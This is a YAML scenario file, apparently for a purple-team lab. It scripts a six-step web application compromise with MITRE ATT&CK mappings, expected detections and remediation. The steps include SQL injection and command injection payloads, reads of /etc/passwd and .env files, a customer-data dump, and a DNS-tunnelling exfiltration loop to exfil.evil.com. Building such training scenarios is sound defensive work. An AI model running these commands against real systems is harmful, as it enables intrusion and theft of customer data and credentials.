metadata:
  id: webapp-compromise
  name: "Web Application Compromise to Data Exfiltration"
  description: >
    Attacker discovers and exploits a vulnerable web application in the DMZ,
    pivots to the internal database, escalates privileges, and exfiltrates
    customer data.
  difficulty: intermediate
  estimated_minutes: 30
  tags:
    - sqli
    - exfiltration
    - webapp
  mitre_attack:
    tactics:
      - Reconnaissance
      - Initial Access
      - Execution
      - Privilege Escalation
      - Collection
      - Exfiltration
    techniques:
      - T1595.002
      - T1190
      - T1059.004
      - T1548.003
      - T1005
      - T1048.003

mode: purple

containers:
  required:
    - wazuh
    - kali

scoring:
  passing_score: 0
  max_score: 0

attack_chain: "Recon -> SQLi -> DB Access -> Privesc -> Data Exfil"

steps:
  - step_number: 1
    technique_id: T1595.002
    technique_name: "Active Scanning: Vulnerability Scanning"
    tactic: Reconnaissance
    description: Scan the DMZ network to discover the web application and open services.
    target: webapp
    commands:
      - "nmap -sV -sC 172.20.1.0/24"
      - "nikto -h http://172.20.1.20:8080"
    prerequisites: []
    expected_detections:
      - product_name: suricata
        analytic_uid: "1000001"
        severity_id: 3
        description: Port scan detected from Kali
        max_detection_time_seconds: 30
    investigation_hints:
      - Check Suricata alerts for scan patterns
      - Review source IP and timing
    remediation:
      - Log the reconnaissance activity
      - No blocking at this stage

  - step_number: 2
    technique_id: T1190
    technique_name: Exploit Public-Facing Application
    tactic: Initial Access
    description: Exploit SQL injection in the login form to bypass authentication and access the admin panel.
    target: webapp
    commands:
      - "curl -X POST http://172.20.1.20:8080/login -d \"username=admin'--&password=x\""
      - "sqlmap -u 'http://172.20.1.20:8080/api/v1/customers?search=test' --dbs"
    prerequisites:
      - T1595.002
    expected_detections:
      - product_name: wazuh
        analytic_uid: "302010"
        analytic_name: sqli
        severity_id: 4
        description: SQL injection attempt in web application
        max_detection_time_seconds: 15
      - product_name: suricata
        analytic_uid: "1000010"
        severity_id: 4
        description: SQL injection pattern in HTTP traffic
        max_detection_time_seconds: 10
    investigation_hints:
      - Check web access logs for SQLi patterns
      - Correlate Wazuh and Suricata alerts
    remediation:
      - Block source IP
      - Review application code for parameterized queries

  - step_number: 3
    technique_id: T1059.004
    technique_name: "Command and Scripting Interpreter: Unix Shell"
    tactic: Execution
    description: Use the command injection vulnerability in the network tools page to get a reverse shell.
    target: webapp
    commands:
      - "curl -X POST http://172.20.1.20:8080/tools/ping -d 'host=;id'"
      - "curl -X POST http://172.20.1.20:8080/tools/ping -d 'host=;cat /etc/passwd'"
    prerequisites:
      - T1190
    expected_detections:
      - product_name: wazuh
        analytic_uid: "302030"
        analytic_name: command_injection
        severity_id: 5
        description: Command injection via network tools
        max_detection_time_seconds: 10
    investigation_hints:
      - Check for unusual process execution on webapp container
      - Review POST parameters
    remediation:
      - Isolate the web server
      - Disable the network tools endpoint

  - step_number: 4
    technique_id: T1548.003
    technique_name: "Abuse Elevation Control Mechanism: Sudo and Sudo Caching"
    tactic: Privilege Escalation
    description: Use exposed database credentials from the .env file or debug endpoint to access the database directly.
    target: db
    commands:
      - "curl http://172.20.1.20:8080/.env"
      - "curl http://172.20.1.20:8080/debug"
      - "psql -h 172.20.2.11 -U techvault -d techvault -c 'SELECT * FROM backup_config'"
    prerequisites:
      - T1059.004
    expected_detections:
      - product_name: wazuh
        analytic_uid: "302040"
        analytic_name: information_disclosure
        severity_id: 4
        description: Access to sensitive files (.env, debug endpoint)
        max_detection_time_seconds: 15
      - product_name: wazuh
        analytic_uid: "304010"
        severity_id: 4
        description: Database connection from unexpected source
        max_detection_time_seconds: 10
    investigation_hints:
      - Check for .env and /debug access in web logs
      - Review database connection logs
    remediation:
      - Rotate exposed credentials
      - Remove debug endpoints
      - Restrict database access by IP

  - step_number: 5
    technique_id: T1005
    technique_name: Data from Local System
    tactic: Collection
    description: Dump customer data and backup configuration (including AWS credentials) from the database.
    target: db
    commands:
      - "psql -h 172.20.2.11 -U techvault -d techvault -c 'COPY customers TO STDOUT WITH CSV'"
      - "psql -h 172.20.2.11 -U techvault -d techvault -c 'SELECT * FROM backup_config'"
    prerequisites:
      - T1548.003
    expected_detections:
      - product_name: wazuh
        analytic_uid: "304030"
        analytic_name: exfiltration
        severity_id: 4
        description: Large data export from sensitive tables
        max_detection_time_seconds: 15
    investigation_hints:
      - Check database query logs for COPY/SELECT on customer data
      - Review data volumes
    remediation:
      - Revoke database access
      - Audit what data was accessed
      - Notify affected customers

  - step_number: 6
    technique_id: T1048.003
    technique_name: "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol"
    tactic: Exfiltration
    description: Exfiltrate collected data via DNS tunneling or direct HTTP transfer to the Kali box.
    target: dns
    commands:
      - "cat customers.csv | base64 | while read line; do nslookup $line.exfil.evil.com; done"
      - "curl -X POST http://172.20.4.30:8888/ -d @customers.csv"
    prerequisites:
      - T1005
    expected_detections:
      - product_name: suricata
        analytic_uid: "1000060"
        severity_id: 4
        description: DNS tunneling detected - excessive TXT queries
        max_detection_time_seconds: 30
    investigation_hints:
      - Check DNS query logs for unusual patterns
      - Look for encoded data in subdomains
    remediation:
      - Block DNS to external resolvers
      - Contain compromised systems
